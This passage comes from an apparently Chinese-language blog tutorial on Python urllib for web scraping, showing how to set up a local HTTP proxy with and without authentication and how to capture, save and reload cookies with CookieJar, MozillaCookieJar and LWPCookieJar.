left;</span><br><span class="line">text-align: center;</span><br><span class="line">width: <span class="number">170</span>px;</span><br><span class="line">padding: <span class="number">15</span>px <span class="number">0</span>;</span><br><span class="line">color: <span class="comment">#545454;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#landing-content &#123;</span></span><br><span class="line">clear: both;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.inp &#123;</span><br><span class="line">height: <span class="number">30</span>px;</span><br><span class="line">margin: <span class="number">0</span> auto;</span><br><span class="line">margin-bottom: <span class="number">30</span>px;</span><br><span class="line">width: <span class="number">200</span>px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.inp&gt;input &#123;</span><br><span class="line">text-align: center;</span><br><span class="line">height: <span class="number">30</span>px;</span><br><span class="line">width: <span class="number">200</span>px;</span><br><span class="line">margin: <span class="number">0</span> auto;</span><br><span class="line">transition: all <span class="number">0.3</span>s ease-<span class="keyword">in</span>-out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.login &#123;</span><br><span class="line">border: <span class="number">1</span>px solid <span class="comment">#A6A6A6;</span></span><br><span class="line">color: <span class="comment">#a6a6a6;</span></span><br><span class="line">height: <span class="number">30</span>px;</span><br><span class="line">width: <span class="number">202</span>px;</span><br><span class="line">text-align: center;</span><br><span class="line">font-size: <span class="number">13.333333</span>px;</span><br><span class="line">margin-left: <span class="number">70</span>px;</span><br><span class="line">line-height: <span class="number">30</span>px;</span><br><span class="line">margin-top: <span class="number">30</span>px;</span><br><span class="line">transition: all <span class="number">0.3</span>s ease-<span class="keyword">in</span>-out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.login:hover &#123;</span><br><span class="line">background: <span class="comment">#A6A6A6;</span></span><br><span class="line">color: <span class="comment">#fff;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#bottom &#123;</span></span><br><span class="line">margin-top: <span class="number">30</span>px;</span><br><span class="line">font-size: <span class="number">13.333333</span>px;</span><br><span class="line">color: <span class="comment">#a6a6a6;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#registeredtxt &#123;</span></span><br><span class="line">float: left;</span><br><span class="line">margin-left: <span class="number">80</span>px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#forgotpassword &#123;</span></span><br><span class="line">float: right;</span><br><span class="line">margin-right: <span class="number">80</span>px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#photo &#123;</span></span><br><span class="line">border-radius: <span class="number">80</span>px;</span><br><span class="line">border: <span class="number">1</span>px solid <span class="comment">#ccc;</span></span><br><span class="line">height: <span class="number">80</span>px;</span><br><span class="line">width: <span class="number">80</span>px;</span><br><span class="line">margin: <span class="number">0</span> auto;</span><br><span class="line">overflow: hidden;</span><br><span class="line">clear: both;</span><br><span class="line">margin-top: <span class="number">30</span>px;</span><br><span class="line">margin-bottom: <span class="number">30</span>px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#photo&gt;img:hover &#123;</span></span><br><span class="line">-webkit-transform: rotateZ(<span class="number">360</span>deg);</span><br><span class="line">-moz-transform: rotateZ(<span class="number">360</span>deg);</span><br><span class="line">-o-transform: rotateZ(<span class="number">360</span>deg);</span><br><span class="line">-ms-transform: rotateZ(<span class="number">360</span>deg);</span><br><span class="line">transform: rotateZ(<span class="number">360</span>deg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#photo&gt;img &#123;</span></span><br><span class="line">height: <span class="number">80</span>px;</span><br><span class="line">width: <span class="number">80</span>px;</span><br><span class="line">-webkit-background-size: <span class="number">220</span>px <span class="number">220</span>px;</span><br><span class="line">border-radius: <span class="number">60</span>px;</span><br><span class="line">-webkit-transition: -webkit-transform <span class="number">1</span>s linear;</span><br><span class="line">-moz-transition: -moz-transform <span class="number">1</span>s linear;</span><br><span class="line">-o-transition: -o-transform <span class="number">1</span>s linear;</span><br><span class="line">-ms-transition: -ms-transform <span class="number">1</span>s linear;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#registered-content &#123;</span></span><br><span class="line">margin-top: <span class="number">40</span>px;</span><br><span class="line">display: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.fix &#123;</span><br><span class="line">clear: both;</span><br><span class="line">&#125;</span><br><span class="line">.form&#123;</span><br><span class="line">display: none;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class="form"&gt;</span><br><span class="line">&lt;div id="landing"&gt;登录&lt;/div&gt;</span><br><span class="line">&lt;div id="registered"&gt;注册&lt;/div&gt;</span><br><span class="line">&lt;div class="fix"&gt;&lt;/div&gt;</span><br><span class="line">&lt;div id=<span class="string">"landing-content"</span>&gt;</span><br><span class="line">&lt;form action=<span class="string">"login.php"</span> method=<span class="string">"post"</span> id=<span class="string">"team_form"</span>&gt;</span><br><span class="line">&lt;div id="photo"&gt;&lt;img src="img/photo.jpg" /&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class="inp"&gt;&lt;input type="text" name="username" id="username" placeholder="用户名" /&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class="inp"&gt;&lt;input type="password" name="pwd" id="pwd" placeholder="密码" /&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class="login" id="submitBut"&gt; 登录&lt;/div&gt;</span><br><span class="line">&lt;!-- &lt;input type="submit" id="aaa" value="登录" style="display:none;"/&gt; --&gt;</span><br><span class="line">&lt;div id="bottom"&gt;&lt;span id="registeredtxt"&gt;立即注册&lt;/span&gt;&lt;span id="forgotpassword"&gt;忘记密码&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div id=<span class="string">"registered-content"</span>&gt;</span><br><span class="line">&lt;div class="inp"&gt;&lt;input type="text" placeholder="请输入用户名" /&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class="inp"&gt;&lt;input type="password" placeholder="请输入密码" /&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class="inp"&gt;&lt;input type="password" placeholder="请再次输入密码" /&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class="inp"&gt;&lt;input type="text" placeholder="电子邮箱" /&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class="login"&gt;立即注册&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">Process finished <span class="keyword">with</span> exit code <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="代理设置方法"><a href="#代理设置方法" class="headerlink" title="代理设置方法"></a>代理设置方法</h2><p>在做爬虫的时候，免不了要是用代理，如果要添加代理，可以这样做，<br>这里我们本地搭建了个代理，它运行在了<code>808</code>端口上。<br><img src="https://img-blog.csdnimg.cn/20200415204106830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> urllib.error <span class="keyword">import</span> URLError</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> ProxyHandler, build_opener</span><br><span class="line">proxy = <span class="string">'127.0.0.1:808'</span></span><br><span class="line">  <span class="comment">##参数是字典，键名是协议类型，健值是代理</span></span><br><span class="line">proxy_handler = ProxyHandler(&#123;</span><br><span class="line">    <span class="string">'http'</span>: <span class="string">'http://'</span> + proxy,</span><br><span class="line">    <span class="string">'https'</span>: <span class="string">'https://'</span> + proxy</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">##Opener已经设置好代理了</span></span><br><span class="line">opener = build_opener(proxy_handler)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = opener.open(<span class="string">'http://httpbin.org/get'</span>)</span><br><span class="line">    <span class="comment"># 运行结果是一个JSON</span></span><br><span class="line">    print(response.read().decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">except</span> URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason)</span><br></pre></td></tr></table></figure><p>这里使用了<code>ProxyHandler</code>,其参数是一个字典，键名是协议类型（比如<code>HTTP</code>或者<code>HTTPS</code>等），键值是代理链接，可以添加多个代理。然后，利用这个<code>Handler</code>及<code>build_opener()</code>方法构造一个opener,之后发送请求即可。<br><img src="https://img-blog.csdnimg.cn/20200415204155172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">输出结果如下：<br>运行结果中<code>origin</code>，表明了客户端的IP，这样我们就成功设置好代理，并可以隐藏了真实的IP了。<br><img src="https://img-blog.csdnimg.cn/2020041520452824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="设置代理的用户名和密码"><a href="#设置代理的用户名和密码" class="headerlink" title="设置代理的用户名和密码"></a>设置代理的用户名和密码</h2><p><img src="https://img-blog.csdnimg.cn/20200415204848477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.error <span class="keyword">import</span> URLError</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> ProxyHandler, build_opener</span><br><span class="line"><span class="comment">##加入代理认证的用户名和密码</span></span><br><span class="line">proxy = <span class="string">'zhang:mima@127.0.0.1:808'</span></span><br><span class="line"></span><br><span class="line">proxy_handler = ProxyHandler(&#123;</span><br><span class="line">    <span class="string">'http'</span>: <span class="string">'http://'</span> + proxy,</span><br><span class="line">    <span class="string">'https'</span>: <span class="string">'https://'</span> + proxy</span><br><span class="line">&#125;)</span><br><span class="line">opener = build_opener(proxy_handler)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = opener.open(<span class="string">'http://httpbin.org/get'</span>)</span><br><span class="line">    print(response.read().decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">except</span> URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason)</span><br></pre></td></tr></table></figure><p>运行结果<br><img src="https://img-blog.csdnimg.cn/20200415210346248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="获取cookie"><a href="#获取cookie" class="headerlink" title="获取cookie"></a>获取cookie</h2><p>Cookie的处理需要相关的<code>Handler</code>了。我们先用实例来看看怎样将网站的<code>cookie</code>获取下来。相关代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> http.cookiejar,urllib.request</span><br><span class="line">cookie=http.cookiejar.CookieJar()</span><br><span class="line">handler=urllib.request.HTTPCookieProcessor(cookie)</span><br><span class="line">opener=urllib.request.build_opener(handler)</span><br><span class="line">response=opener.open(<span class="string">'http://zkaq.org'</span>)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> cookie:</span><br><span class="line">    print(item.name+<span class="string">"="</span>+item.value)</span><br></pre></td></tr></table></figure><p>首先，我们必须声明一个CookieJar对象。接下来，就需要利用HTTPCookieProcessor来构建一个Handler，最后利用build_opener（）方法构建出Opener，执行open()函数即可。运行结果如下：<br><img src="https://img-blog.csdnimg.cn/20200415213707260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">可以看到，这里输出了每条Cookie的名称和值<br>不过既然能输出，那可不可以输出成文件格式呢？我们知道<code>Cookies</code>实际上也是以文本形式保存的。<br>通过下面实例来看看，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> http.cookiejar,urllib.request</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置保存cookie的文件，同级目录下的cookie.txt</span></span><br><span class="line">filename = <span class="string">'cookie.txt'</span></span><br><span class="line"><span class="comment">#声明一个MozillaCookieJar对象实例来保存cookie，之后写入文件</span></span><br><span class="line">cookie = http.cookiejar.MozillaCookieJar(filename)</span><br><span class="line"><span class="comment">#利用urllib库的HTTPCookieProcessor对象来创建cookie处理器</span></span><br><span class="line">handler = urllib.request.HTTPCookieProcessor(cookie)</span><br><span class="line"><span class="comment">#通过handler来构建opener</span></span><br><span class="line">opener = urllib.request.build_opener(handler)</span><br><span class="line"><span class="comment">#创建一个请求，原理同urllib2的urlopen</span></span><br><span class="line">response = opener.open(<span class="string">"http://i.chaoxing.com/base?t=1586959507557"</span>)</span><br><span class="line"><span class="comment">#保存cookie到文件</span></span><br><span class="line">cookie.save(ignore_discard=<span class="literal">True</span>, ignore_expires=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>这时<code>Cookiejar</code>就需要换成<code>MozillaCookiejar</code>，它在生成文件时会用到，是<code>Cookiejar</code>的子类，可以用来处理Cookie和文件的相关事件，比如读取和保存<code>Cookies</code>,可以将<code>Cookies</code>保存成<code>Mozilla</code>型浏览器的cookie格式。运行之后发现生成<code>cookies.txt</code>文件，其内容如下：</p><p><img src="https://img-blog.csdnimg.cn/20200415223341168.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>另外，<code>LWPCookiejar</code>同样也可以读取和保存<code>Cookies</code>,但是保存的格式和<code>MozillaCookiejar</code>不一样，它会保存成<code>libwww-perl(LWP)</code>格式的<code>Cookies</code>文件。代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> http.cookiejar,urllib.request</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置保存cookie的文件，同级目录下的cookie.txt</span></span><br><span class="line">filename = <span class="string">'cookie.txt'</span></span><br><span class="line"><span class="comment">#声明一个MozillaCookieJar对象实例来保存cookie，之后写入文件</span></span><br><span class="line">cookie = http.cookiejar.LWPCookieJar(filename)</span><br><span class="line"><span class="comment">#利用urllib库的HTTPCookieProcessor对象来创建cookie处理器</span></span><br><span class="line">handler = urllib.request.HTTPCookieProcessor(cookie)</span><br><span class="line"><span class="comment">#通过handler来构建opener</span></span><br><span class="line">opener = urllib.request.build_opener(handler)</span><br><span class="line"><span class="comment">#创建一个请求，原理同urllib2的urlopen</span></span><br><span class="line">response = opener.open(<span class="string">"http://i.chaoxing.com/base?t=1586959507557"</span>)</span><br><span class="line"><span class="comment">#保存cookie到文件</span></span><br><span class="line">cookie.save(ignore_discard=<span class="literal">True</span>, ignore_expires=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200415223857672.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">尤其看来，生成的格式差异还是有差异的。那么生成<code>Cookies</code>文件后，怎样从文件中读取并利用呢？<br>下面我们以<code>LWPCookiejar</code>可是为例来看一下，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> http.cookiejar,urllib.request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">filename = <span class="string">'cookie.txt'</span></span><br><span class="line"></span><br><span class="line">cookie = http.cookiejar.LWPCookieJar()</span><br><span class="line">cookie.load(<span class="string">'cookie.txt'</span>,ignore_discard=<span class="literal">True</span>,ignore_expires=<span class="literal">True</span>)</span><br><span class="line">handler = urllib.request.HTTPCookieProcessor(cookie)</span><br><span class="line"></span><br><span class="line">opener = urllib.request.build_opener(handler)</span><br><span class="line"></span><br><span class="line">response = opener.open(<span class="string">"http://i.chaoxing.com/base?t=1586959507557"</span>)</span><br><span class="line"></span><br><span class="line">print(response.read().decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure><p>可以看到，这里调用<code>load()</code>方法来读取本地的<code>Cookie</code>文件，获取到<code>Cookie</code>的内容。不过前提我们首先生成了<code>LWPCookiejar</code>格式的<code>cookie</code>,并保存文件，然后读取<code>cookies</code>之后使用同样的方法构建<code>Handler</code>和<code>Opener</code>即可完成操作<br><img src="https://img-blog.csdnimg.cn/20200415224825357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">运行结果正常的话，会输出超星学习通网页的源码。运行结果如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span 